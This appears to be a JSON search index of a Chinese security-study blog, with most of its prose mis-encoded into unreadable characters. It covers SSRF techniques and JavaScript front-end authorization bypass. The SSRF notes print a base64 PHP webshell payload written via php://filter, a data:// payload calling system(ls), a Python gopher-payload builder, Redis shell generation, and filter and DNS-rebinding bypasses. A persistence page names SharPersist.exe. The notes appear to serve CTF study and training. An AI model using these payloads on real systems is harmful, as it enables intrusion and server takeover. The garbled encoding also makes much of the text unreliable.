[{"title":"æœ¬ç«™æŒ‡å—ï¼šå…³äºè¿™é‡Œçš„è®°å½•","path":"/2025/12/23/æœ¬ç«™æŒ‡å—ï¼šå…³äºè¿™é‡Œçš„è®°å½•/","content":"1# ğŸ‘‹ æ¬¢è¿æ¥åˆ°æˆ‘çš„ Blogå¾ˆé«˜å…´ä½ èƒ½è®¿é—®è¿™é‡Œã€‚å»ºç«‹è¿™ä¸ªåšå®¢çš„åˆè¡·ï¼Œæ˜¯ä¸ºäº†å¯¹è‡ªå·±æ¼«é•¿çš„ç½‘ç»œå®‰å…¨å­¦ä¹ ä¹‹è·¯åšä¸€ä¸ªç³»ç»Ÿçš„æ¢³ç†å’Œæ²‰æ·€ã€‚ 2# è¿™é‡Œçš„å®šä½è¿™ä¸æ˜¯ä¸€ä¸ªéšæ„çŒæ°´çš„åœ°æ–¹ï¼Œæˆ‘ä¸»è¦ä¼šåœ¨è¿™é‡Œåˆ†äº«ä¸¤ç±»å†…å®¹ï¼š 3# 1. ğŸ§© çŸ¥è¯†ç‚¹ç¢ç‰‡ (Knowledge Points)åœ¨å­¦ä¹  Web å®‰å…¨ã€å†…ç½‘æ¸—é€çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ€»ä¼šé‡åˆ°å„ç§å„æ ·ç»†ç¢ä½†å…³é”®çš„çŸ¥è¯†ç‚¹ï¼ˆæ¯”å¦‚æŸä¸ªç‰¹å®šçš„ Bypass æŠ€å·§ã€æŸä¸ªåè®®çš„ç‰¹æ®Šç”¨æ³•ï¼‰ã€‚æˆ‘ä¼šæŠŠè¿™äº›ç¢ç‰‡åŒ–çš„çŸ¥è¯†æ•´ç†æˆæ–‡æ¡£ï¼Œæ–¹ä¾¿éšæ—¶æŸ¥é˜…ï¼Œä¹Ÿå¸Œæœ›èƒ½å¸®åˆ°é‡åˆ°åŒæ ·é—®é¢˜çš„ä½ ã€‚ ä½ å¯ä»¥åœ¨èœå•çš„ æ–‡æ¡£ - [WebçŸ¥è¯†ç‚¹] ä¸­æ‰¾åˆ°å®ƒä»¬ã€‚ 3# 2. ğŸ¯ é¶åœºå®æˆ˜ WP (WriteUp)â€œçº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…â€ã€‚é™¤äº†ç†è®ºï¼Œæˆ‘ä¼šè®°å½•æŒ‘æˆ˜å„ç§å¤§å‹ç»¼åˆé¶åœºï¼ˆå¦‚ VulnHubï¼ŒHackTheBox ç­‰ï¼‰çš„å®Œæ•´è¿‡ç¨‹ã€‚è¿™éƒ¨åˆ†å†…å®¹ä¼šé‡ç‚¹å¤ç›˜ï¼š æ€è·¯çš„å½¢æˆ é‡åˆ°çš„å‘ä¸æ’é”™ æœ€ç»ˆçš„åˆ©ç”¨é“¾æ¡ ä½ å¯ä»¥åœ¨èœå•çš„ æ–‡æ¡£ - [WP] ä¸­æ‰¾åˆ°å®ƒä»¬ã€‚ 2# ğŸš€ å…³äºä½œè€…ä¸€åæ­£åœ¨è·¯ä¸Šçš„å®‰å…¨å­¦ä¹ è€…ã€‚å¦‚æœä½ å¯¹æœ¬ç«™çš„å†…å®¹æœ‰ç–‘é—®ï¼Œæˆ–è€…æƒ³äº¤æµæŠ€æœ¯ï¼Œæ¬¢è¿é€šè¿‡ ç¤¾äº¤ é‡Œçš„æ–¹å¼è”ç³»æˆ‘ã€‚ Stay Hungry, Stay Foolish. (æœ¬æ–‡ç½®é¡¶æ˜¾ç¤ºï¼Œä½œä¸ºæœ¬ç«™å†…å®¹çš„ç´¢å¼•è¯´æ˜)","tags":["è®¡åˆ’","è¯´æ˜"],"categories":["æ‚è°ˆ"]},{"title":"æƒé™ç»´æŒ","path":"/wiki/å†…ç½‘/æƒé™ç»´æŒ.html","content":"SharPersist.exe"},{"title":"SSRF_å†…ç½‘è®¿é—®","path":"/wiki/WP/SSRF_å†…ç½‘è®¿é—®.html","content":"ä¼ªåè®® file://php://input # æ‰§è¡Œphpä»£ç php://filter # è¯»å–æºç  writeçš„è¯GETæäº¤?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOSTæäº¤content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=zip:// #å‹ç¼©æ–‡ä»¶data:// #æ‰§è¡Œphpä»£ç  ?url=data://text/plain,?php system(ls);? gopheråè®® gopheråè®®ï¼ˆæ”»å‡»å†…ç½‘æœåŠ¡çš„ä¸‡é‡‘æ²¹ï¼‰ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell(å…·ä½“çœ‹è„šæœ¬æ–‡ä»¶)from urllib.parse import quotepayload = \\POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=260a97ac2ef360dec36238c7d6c49c25payload = quote(payload)payload = payload.replace(%0A, %0D%0A)payload = fgopher://127.0.0.1:80/_quote(payload)print(payload)URL: gopher://host:port/gopher-path_åæ¥TCPæ•°æ®æµ---ä¹Ÿå°±æ˜¯æ„é€ çš„åŒ…ï¼ˆè¦è¿›è¡Œurlç¼–ç ï¼Œå…·ä½“å‡ æ¬¡çœ‹æƒ…å†µï¼‰(!!!ä¸€å®šè¦æœ‰ä¸‹æ–œæ )gopheråè®®ä¸­çš„postè¯·æ±‚éœ€è¦åŒ…å«å‡ ä¸ªå¿…è¦çš„å­—æ®µHOSTï¼ŒContent-Length,Content-Type POSTè¯·æ±‚ç¼–ç å‡ºæ¥çš„æ¢è¡Œæ˜¯%0Aï¼Œå°±éœ€è¦æŠŠ%0Aæ”¹æˆ%0D%0Agopher://127.0.0.1:80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D260a97ac2ef360dec36238c7d6c49c25%250D%250A fastcgiåè®®ï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰ CGIåè®® # è®¿é—®url -- æµè§ˆå™¨ç”ŸæˆHTTPè¯·æ±‚æŠ¥æ–‡ -- web serverè§£æè¯·æ±‚ï¼ˆä¾‹å¦‚nginxï¼‰web server æ˜¯å†…å®¹çš„åˆ†å‘è€…å½“è®¿é—®é™æ€é¡µé¢æ—¶ï¼Œweb server ä¼šç›´æ¥è¿”å›èµ„æºï¼Œä¾‹å¦‚index.htmlå½“è®¿é—®åŠ¨æ€é¡µé¢æ—¶ï¼Œweb server ä¼šè°ƒç”¨è§£æå™¨ï¼Œä¾‹å¦‚index.php # -- è®¿é—®CGI# -- CGIåˆå§‹åŒ–ç¯å¢ƒï¼ŒåŠ è½½é…ç½®ï¼Œå¤„ç†è¯·æ±‚ï¼Œè¿”å›èµ„æºï¼Œç»“æŸè¿›ç¨‹ ï¼ˆæ¯æ¬¡å¤„ç†è¯·æ±‚åéƒ½ä¼šé”€æ¯è¿›ç¨‹ï¼Œæµªè´¹èµ„æºï¼‰FASTCGI # è®¿é—®url -- æµè§ˆå™¨ç”ŸæˆHTTPè¯·æ±‚æŠ¥æ–‡ -- web serverè§£æè¯·æ±‚ï¼ˆä¾‹å¦‚nginxï¼‰å½“è®¿é—®index.phpæ—¶ï¼Œweb server ä¼šæŠŠHTTPè¯·æ±‚è½¬æ¢ä¸ºFastCGIè¯·æ±‚# -- è½¬æ¢ä¸ºFastCGIåè®®æ ¼å¼å¹¶å‘é€ç»™è§£æå™¨ï¼Œè¿™é‡Œä»¥phpä¸ºä¾‹# -- å‘é€è‡³php-fpm process managerphp-fpmæ¥æ”¶åˆ°è¯·æ±‚åï¼ŒæŠŠè¯·æ±‚åˆ†é…ç»™ä¸€ä¸ªworkerï¼Œworkerå°±æ˜¯ä¸€ä¸ªè§£ææœåŠ¡çš„è¿›ç¨‹ï¼ˆä¸€ç›´è¿è¡Œï¼‰ï¼Œworkeræ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œè§£æphpï¼Œè¿”å›é¡µé¢ä¾‹å¦‚ï¼Œæ‹›æ–°å¹³å°è¿è¡Œäº†15ä¸ªworkerï¼Œï¼ˆä¸è€ƒè™‘nginxå¤„ç†æ—¶é—´ï¼‰åŒæ—¶å¯ä»¥å¤„ç†15ä¸ªè¯·æ±‚# -- php-fpmè§£æå¹¶å“åº” redis åè®®ï¼Œå’Œä¸Šé¢ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥ç”¨gopherus çš„redisæ¨¡å— ï¼Œä½¿ç”¨é»˜è®¤çš„ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆshell.php cmdä¸ºå¯†ç  SSRF Bypass url Bypass 1.ä½¿ç”¨HTTPåŸºç¡€è®¤è¯ HTTP åŸºæœ¬èº«ä»½è®¤è¯å…è®¸ Web æµè§ˆå™¨æˆ–å…¶ä»–å®¢æˆ·ç«¯ç¨‹åºåœ¨è¯·æ±‚æ—¶æä¾›ç”¨æˆ·åå’Œå£ä»¤å½¢å¼çš„èº«ä»½å‡­è¯çš„ä¸€ç§ç™»å½•éªŒè¯æ–¹å¼ã€‚ä¹Ÿå°±æ˜¯ï¼šhttp://www.xxx.com@www.yyy.comå½¢å¼ç®€å•æ¥è¯´ï¼Œå°±æ˜¯http://www.baidu.com@192.168.0.1/ä¸http://192.168.0.1è¯·æ±‚çš„éƒ½æ˜¯192.168.0.1çš„å†…å®¹ã€‚è¿™é‡Œçš„@æ˜¯ä¸»åŸŸåè§£æï¼Œå³@ç¬¦å·åé¢ç›´æ¥è·ŸåŸŸåï¼Œ@ç¬¦å·å‰é¢çš„å†…å®¹ä¼šè¢«è§†ä¸ºç”¨æˆ·åï¼Œç›¸å½“äºä»¥http://baidu.comçš„ç”¨æˆ·åè®¿é—®192.168.0.1/flag.phpï¼Œè‡³äºç”¨æˆ·åæ˜¯å•¥ä¸é‡è¦ï¼Œå…³é”®æ˜¯@åé¢çš„æ‰æ˜¯è§£æçš„åœ°å€ï¼2.ä½¿ç”¨nip.io .nip.io æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åŸŸååç¼€ï¼Œå®ƒæä¾›äº†ä¸€ç§å…è´¹ä¸”ç®€ä¾¿çš„æ–¹å¼ï¼Œå¯ä»¥å°†ç‰¹å®šæ ¼å¼çš„åŸŸåè§£æä¸ºå¯¹åº”çš„IPåœ°å€ï¼Œå¯ä»¥ä½œä¸ºåº”ç”¨è·¯ç”±çš„è§£ææœåŠ¡ã€‚è¿™çœå»äº†é…ç½®æœ¬åœ°hostsæ–‡ä»¶çš„æ­¥éª¤ã€‚ä¾‹å¦‚ï¼Œå½“è®¿é—®http://anything-IP Address.nip.ioæ—¶ï¼Œå®ƒå°†è§£æåˆ°å¯¹åº”çš„IPåœ°å€IP Address?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php æ•°å­—IP Bypass 1.ipè½¬int 2.åå…­è¿›åˆ¶3.å…«è¿›åˆ¶4.localhostã€http://0/ç­‰5.ipv6ç»•è¿‡ 302è·³è½¬ Bypass éœ€è¦vps æš‚æ—¶è·³è¿‡ DNSé‡è§£æ å¯¹äºç”¨æˆ·è¯·æ±‚çš„URLå‚æ•°ï¼Œé¦–å…ˆæœåŠ¡å™¨ç«¯ä¼šå¯¹å…¶è¿›è¡ŒDNSè§£æï¼Œç„¶åå¯¹äºDNSæœåŠ¡å™¨è¿”å›çš„IPåœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨é»‘åå•ä¸­ï¼Œå°±passè¿‡æ»¤æ‰.ä½†æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡å»è¯·æ±‚DNSæœåŠ¡è¿›è¡ŒåŸŸåè§£æåˆ°ç¬¬äºŒæ¬¡æœåŠ¡ç«¯å»è¯·æ±‚URLä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ—¶é—´å·®ï¼Œåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡ŒDNS é‡ç»‘å®šæ”»å‡»ï¼Œåˆ©ç”¨DNS RebindingæŠ€æœ¯ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ ¡éªŒIPçš„æ—¶å€™è¿”å›ä¸€ä¸ªåˆæ³•çš„IPï¼Œåœ¨çœŸå®å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼Œè¿”å›æˆ‘ä»¬çœŸæ­£æƒ³è¦è®¿é—®çš„å†…ç½‘IPå³å¯è¦å®ŒæˆDNSé‡ç»‘å®šæ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸŸåï¼Œå¹¶ä¸”å°†è¿™ä¸ªåŸŸåçš„è§£ææŒ‡å®šåˆ°æˆ‘ä»¬è‡ªå·±çš„DNS Serverï¼Œåœ¨æˆ‘ä»¬çš„å¯æ§çš„DNS Serverä¸Šç¼–å†™è§£ææœåŠ¡ï¼Œè®¾ç½®TTLæ—¶é—´ä¸º0ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢æœ‰DNSæœåŠ¡å™¨å¯¹è§£æç»“æœè¿›è¡Œç¼“å­˜ã€‚è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼Œå®Œæ•´çš„æ”»å‡»æµç¨‹ä¸ºï¼š1ã€æœåŠ¡å™¨ç«¯è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP2ã€å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯3ã€æœåŠ¡å™¨ç«¯å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€4ã€ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœæ€»ç»“æ¥è¯´ï¼šç”±äºæˆ‘ä»¬æ— æ³•åœ¨ç¨‹åºè¿è¡Œæ—¶ä»¥æ¯«ç§’ä¸ºå•ä½æ‰‹åŠ¨æ›´æ”¹DNSè®°å½•ï¼Œæ‰€ä»¥è¦æƒ³å®ç°DNSé‡ç»‘å®šæ”»å‡»ï¼Œå°±å¿…é¡»é…ç½®ä¸€ä¸ªè‡ªå®šä¹‰çš„æ¶æ„DNSæœåŠ¡å™¨ï¼Œå¹¶è®¾å®šå¥½æŒ‡å®šåŸŸåçš„è§£æIPï¼Œå†å°†TTLè®¾ç½®ä¸º0ï¼Œä½¿å…¶è§£ææ—¶åœ¨éæ³•å†…ç½‘IPä¸åˆæ³•å…¶ä»–IPé—´åå¤æ¨ªè·³ã€‚ç”¨ä¸‹é¢è¿™ä¸ªç½‘ç«™å¯ä»¥è¿›è¡ŒDNSé‡ç»‘å®šrbndr.us dns rebinding service (cmpxchg8b.com)ç»‘å®šçš„ä¸¤ä¸ªipä¸­ä¿è¯æœ‰ä¸€ä¸ªæ˜¯127.0.0.1å³å¯ï¼Œæˆ‘è¿™é‡Œå’Œ192.168.0.1ç»‘å®šäº†ï¼Œç»“æœä¸º7f000001.c0a80001.rbndr.uså› æ­¤æˆ‘ä»¬çš„url=7f000001.c0a80001.rbndr.us/flag.php ï¼Œæ³¨æ„è¿™ä¸ªåŸŸåç›¸å½“äºç»‘å®šäº†ä¸¤ä¸ªipåœ°å€ï¼ˆåŒä¸€æ—¶åˆ»åªå¯¹åº”ä¸€ä¸ªï¼‰ï¼Œç”±äºæ— æ³•ç¡®å®šè¿›è¡Œdnsæ ¡éªŒæ—¶çš„ipæ˜¯å¦ä¸º127.0.0.1ï¼Œå¯èƒ½ä¸€æ¬¡è¯·æ±‚ä¸æˆåŠŸï¼Œå¤šåˆ·æ–°å‡ æ¬¡å³å¯ã€‚"},{"title":"æ¼æ´å‘ç°","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ¼æ´å‘ç°.html","content":""},{"title":"JSæ¸—é€","path":"/wiki/ç¬”è®°/JSæ¸—é€.html","content":"å…ˆæ‰¾åˆ°JSæ–‡ä»¶ ç†ŠçŒ«å¤´ Packer-Fuzzer å¼‚æ­¥js JSæ¥å£æå– è„šæœ¬æ–‡ä»¶ ç›®å½•FUZZå’Œæ¥å£æå–çš„å¥‡å¦™æ­é… æˆ‘ä»¬å‡è®¾ä½ é€šè¿‡åˆ†æJSæ‰¾åˆ°äº†å¾ˆå¤šæ¥å£ï¼Œæ¯”å¦‚ http://test.hack.com/api/test/admin/delete http://test.hack.com/api/test/admin/edit http://test.hack.com/api/test/admin/get è¿™ç§æ—¶å€™æˆ‘ä»¬è¦æ³¨æ„äº†ï¼Œæ¥å£çš„å‘½åä¸€èˆ¬éƒ½å’ŒåŠŸèƒ½é«˜åº¦ç›¸å…³ã€‚è¿™é‡Œæœ‰ç®¡ç†å‘˜ç”¨æˆ·çš„åˆ é™¤ï¼ˆdeleteï¼‰ã€ç¼–è¾‘ï¼ˆeditï¼‰ã€è·å–ï¼ˆgetï¼‰ é‚£ä¹ˆä½ è¿˜èƒ½æƒ³åˆ°ä»€ä¹ˆï¼Ÿæ˜¯ä¸æ˜¯æœ‰å¯èƒ½èƒ½æœ‰æ·»åŠ ï¼ˆaddã€createï¼‰ã€‚é‚£æˆ‘ä»¬å¯ä»¥æ³¨æ„FUZZè¿™ä¸ªç‚¹ http://test.hack.com/api/test/admin/add http://test.hack.com/api/test/admin/create æ€»ä¹‹å°±æ˜¯æœ‰â€œæ·»åŠ â€è¿™ä¸ªæ„æ€çš„å•è¯ã€‚å¯¹äºå¢åˆ æ”¹æŸ¥çš„æ¥å£å…³é”®è¯ï¼Œæˆ‘è‡ªå·±æ€»ç»“äº†ä¸€äº›ã€‚ æŸ¥è¯¢ï¼ˆè·å–ä¿¡æ¯ï¼‰search list select query get find åˆ é™¤ï¼ˆåˆ é™¤æŸä¸ªæ•°æ®ï¼‰del Delete ç¼–è¾‘ï¼ˆæ›´æ–°æŸä¸ªä¿¡æ¯ï¼‰Update Up edit Change æ·»åŠ ï¼ˆå¢åŠ æŸä¸ªä¿¡æ¯ï¼‰add create new APIæµ‹è¯• GET POST æµ‹è¯• åˆ«å¿˜äº†è·¯å¾„å¯èƒ½æœ‰é—®é¢˜ POSTå‚æ•°æµ‹è¯• è¿”å›å†…å®¹æ‹¼æ¥ JSæŸ¥æ‰¾ è„šæœ¬è·å– è·¯å¾„ä¸‰ç§æƒ…å†µ ç¬¬ä¸€ç§æ˜¯ç›®æ ‡ç«™ç‚¹æ²¡æœ‰ä»»ä½•å¯¹å‰ç«¯uriçš„é‰´æƒã€‚æˆ‘ä»¬è¿™ä¹ˆå»è®¿é—®ï¼Œèƒ½ç›´æ¥çœ‹åˆ°é¡µé¢ï¼Œä¹Ÿä¸ä¼šç»™ä½ è·³è½¬å•¥çš„ï¼Œè¿™æ—¶å€™å°±å¯ä»¥è°ƒç”¨é¡µé¢ä¸Šçš„åŠŸèƒ½å»æŠ“åŒ…ï¼Œåˆ†æè¿™äº›åŠŸèƒ½ç‚¹å¯¹åº”çš„æ¥å£çš„é—®é¢˜äº†ã€‚ ç¬¬äºŒç§æƒ…å†µç¨å¾®å¥½ç‚¹ï¼Œå°±æ˜¯ä½ è¿™ä¹ˆå»è®¿é—®ï¼Œæœ‰æ¦‚ç‡çœ‹åˆ°è¦è®¿é—®çš„é¡µé¢é—ªä¸€ä¸‹ï¼Œç„¶åç»™ä½ é‡å®šå‘å›ç™»å½•é¡µé¢ï¼Œè¿™ç§æ—¶å€™æœ‰ç§æ‹¼æ‰‹é€Ÿçš„ç©æ³•ï¼Œåœ¨é‡å®šå‘å›ç™»å½•é¡µé¢ä¹‹å‰ï¼Œæµè§ˆå™¨ä¸Šçš„åˆ·æ–°æŒ‰é’®ä¼šå˜æˆè¿™ä¸ªçŠ¶æ€ï¼šåœ¨ä»–é‡å®šå‘å›å»ä¹‹å‰ï¼Œå¿«é€Ÿç‚¹ä¸€ä¸‹è¿™ä¸ªXï¼Œé‚£ä¹ˆåç»­åŠ¨ä½œå°±ä¼šç»ˆæ­¢æ‰§è¡Œï¼Œä½ çš„é¡µé¢å°±ä¼šå¡ä½ã€‚è¿™æ—¶å€™æˆ‘ä»¬ä¹Ÿæ˜¯å¼€å¯burpæ„‰å¿«æŠ“åŒ…å°±è¡Œã€‚å…¶å®å°±æ˜¯é˜»æ­¢é‡å®šå‘çš„æ€è·¯ã€‚ - font style=color:rgb(0,0,0);ç¬¬ä¸‰ç§æƒ…å†µå°±æ˜¯ï¼Œæˆ‘ä»¬æ²¡æ³•çœ‹åˆ°æƒ³è®¿é—®çš„é¡µé¢ï¼Œå‰ç«¯è¦ä¹ˆæ²¡ååº”ï¼Œè¦ä¹ˆç»™ä½ å¼¹å‡ºä¸ªæ²¡æœ‰æƒé™ï¼Œè¦ä¹ˆç›´æ¥é‡å®šå‘åˆ°/fontfont style=color:rgb(0,0,0);/login/fontfont style=color:rgb(0,0,0);ç™»å½•é¡µã€‚è¿™ç§æ—¶å€™æˆ‘ä»¬åˆè¯¥æ€ä¹ˆæµ‹è¯•å‘¢ï¼Ÿä¸‹é¢çš„å†…å®¹å°±éœ€è¦ä¸€ç‚¹å‰ç«¯è°ƒè¯•å’Œ/fontfont style=color:rgb(0,0,0);JS/fontfont style=color:rgb(0,0,0);åˆ†æçš„åŸºç¡€äº†ï¼Œæœ¬æ–‡ä¸ä¼šæ·±å…¥å±•å¼€ï¼Œä»…ä½œæ¡ˆä¾‹ä»‹ç»ã€‚/font å‡è®¾è¿™ä¹ˆä¸€ä¸ªç½‘ç«™ï¼Œæˆ‘ä»¬æå–å‡ºä¸€ä¸ªå‰ç«¯uriä¸ºhome ï¼ˆå¾ˆå¸¸è§ï¼‰ æˆ‘ä»¬è‡ªç„¶è¦å°è¯•è®¿é—®ï¼Œä¸€è®¿é—®ï¼Œå‘ç°ç›´æ¥ç»™æˆ‘ä»¬é‡å®šå‘åˆ°ç™»å½•å£ æˆ‘ä»¬è‡ªç„¶è¦å°è¯•è®¿é—®ï¼Œä¸€è®¿é—®ï¼Œå‘ç°ç›´æ¥ç»™æˆ‘ä»¬é‡å®šå‘åˆ°ç™»å½•å£ è¿™å°±è¯´æ˜è¿™ä¸ªå‰ç«¯è‡³å°‘æœ‰ä¸¤å±‚æ ¡éªŒï¼Œä¸€å±‚ä¸ç”¨æˆ·ç™»å½•çŠ¶æ€æœ‰å…³ï¼Œä¸€å±‚ä¸ç”¨æˆ·æƒé™æœ‰å…³ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬åœ¨æ§åˆ¶å°æœç´¢â€œå†…æµ‹â€å…³é”®è¯ï¼Œå®šä½åˆ°ç”¨æˆ·æƒé™é‰´æƒé€»è¾‘ã€‚ åˆ†æè¿™ä¸ªå±€éƒ¨ï¼Œæˆ‘ä»¬å…¶å®å¾ˆå®¹æ˜“èƒ½æ³¨æ„åˆ°è¿™é‡Œçš„å‰ç«¯é‰´æƒé€»è¾‘ã€‚å‰ç«¯è·å–o.state.account.permissionå±æ€§ï¼Œä¸€æ—¦è¿™ä¸ªå±æ€§ä¸ºfalseï¼Œé‚£ä¹ˆå°±ä¼šæç¤ºå¹³å°å†…æµ‹è¿™ä¸ªé”™è¯¯ï¼Œæ— æ³•è®¿é—®åˆ°å¯¹åº”çš„å‰ç«¯uriã€‚ é‚£ä¹ˆç”¨æˆ·ç™»å½•çŠ¶æ€å¯¹åº”ä»€ä¹ˆå±æ€§å‘¢ï¼Ÿå¾€ä¸Šç¿»ä¸€ä¸‹ï¼Œä¸éš¾çœ‹å‡ºå¯¹åº”o.state.baseInfo.isLoginå±æ€§ å› æ­¤æˆ‘ä»¬å¯ä»¥æ¨æµ‹ï¼Œstateä¸­ä¿å­˜äº†ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¯”å¦‚ç™»å½•çŠ¶æ€ã€æƒé™ç­‰ç­‰ã€‚å› æ­¤è¿™é‡Œå¥½åŠäº†ï¼Œæˆ‘ä»¬ç»™ä¸Šè¿°ä¸¤ä¸ªä½ç½®æ‰“ä¸Šæ–­ç‚¹ï¼Œé‡æ–°è®¿é—®homeã€‚è¿›å…¥ç¬¬ä¸€ä¸ªæ–­ç‚¹ åœ¨æ§åˆ¶å°å°†å…¶å¼ºè¡Œæ”¹ä¸ºtrue è¿›å…¥ä¸‹ä¸€æ–­ åŒæ ·åœ°ï¼Œå†æ§åˆ¶å°å¯¹å…¶èµ‹å€¼ä¸º1 å†å¾€ä¸‹èµ°ï¼Œæ­¤æ—¶ä¼šè·³è½¬åˆ°ä¸€ä¸ªcontracté¡µé¢ è™½ç„¶æ²¡è¿›å…¥homeé¡µé¢ï¼Œä½†æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å°±æ¥åˆ°äº†ä¸€ä¸ªåŸæœ¬æ— æ³•ç›´æ¥è®¿é—®åˆ°çš„ä¸€ä¸ªå‰ç«¯uriï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨å®ƒçš„åŠŸèƒ½äº†ï¼Œçœ‹è¿™ä¸ªé¡µé¢è¦å¡«çš„ä¸œè¥¿å¾ˆå¤šï¼Œæœ€åçš„ä¼ å‚è‚¯å®šå·¨å¤æ‚ï¼Œå°±ç®—å¼€å‘å¥½å¿ƒå‘Šè¯‰ä½ ç¼ºäº†ä»€ä¹ˆå‚æ•°ï¼Œä½ æ•²éƒ½è¦æ•²åŠå¤©ï¼Œç”¨è¿™ç§æ–¹æ³•æµ‹èµ·æ¥å°±å¿«å¤šäº†ã€‚ å½“ç„¶ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è¿›å…¥homeé¡µé¢ï¼Œé‡å®šå‘åˆ°è¿™ä¸ªå®Œå–„è´¦å·ä¿¡æ¯çš„é¡µé¢ï¼Œè¯´æ˜è¿˜æ˜¯æœ‰å“ªé‡Œçš„é‰´æƒæ²¡æå¥½ï¼Œæˆ‘ä»¬å†å›åˆ°åˆšåˆšçš„é‰´æƒé€»è¾‘éƒ¨åˆ† å¯ä»¥å‘ç°ï¼Œåç»­å…¶å®è¿˜å¯¹o.state.account.permissionçš„å€¼åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœå€¼ä¸º1ï¼Œé‚£ä¹ˆä¼šç›´æ¥è¿›å…¥contracté¡µé¢ã€‚å€¼åªè¦æ˜¯å¤§äº1çš„æ•´æ•°ï¼Œå…¶å®éƒ½å¯ä»¥è®¿é—®åˆ°homeé¡µé¢ å› æ­¤åœ¨æ§åˆ¶å°å°†permissionæ”¹ä¸º3 å†è®¿é—®homeï¼ŒæˆåŠŸï¼š è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„‰å¿«çš„æµ‹è¯•åå°çš„å„ç§åŠŸèƒ½ç‚¹äº†ã€‚å½“ç„¶ä¸Šè¿°æ“ä½œå¯¹ä¸æ‡‚JSå’Œå‰ç«¯è°ƒè¯•çš„å¸ˆå‚…è‚¯å®šä¹Ÿä¸å¤ªå‹å¥½ã€‚å®é™…ä¸Šä¸Šè¿°æ“ä½œå’Œå¹³æ—¶æµ‹è¯•ä¸šåŠ¡é€»è¾‘æ¼æ´ä¸­çš„â€œä¿®æ”¹è¿”å›åŒ…â€æ“ä½œæ˜¯æœ‰ç­‰ä»·å…³ç³»çš„ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿ æˆ‘ä»¬é‡æ–°è®¿é—®ä¸€ä¸‹homeé¡µé¢ï¼Œç„¶ååœ¨burpæŠ“åŒ…ï¼Œæ‹¦æˆªä¸€ä¸‹è¿”å›åŒ…ã€‚ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªstate_userçš„åç«¯æ¥å£ï¼Œä»è¿™ä¸ªæ¥å£çš„åå­—æˆ‘ä»¬å…¶å®å°±çŸ¥é“ï¼Œå®ƒæ˜¯ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªç”¨æˆ·çŠ¶æ€çš„ã€‚ ç„¶åä½ 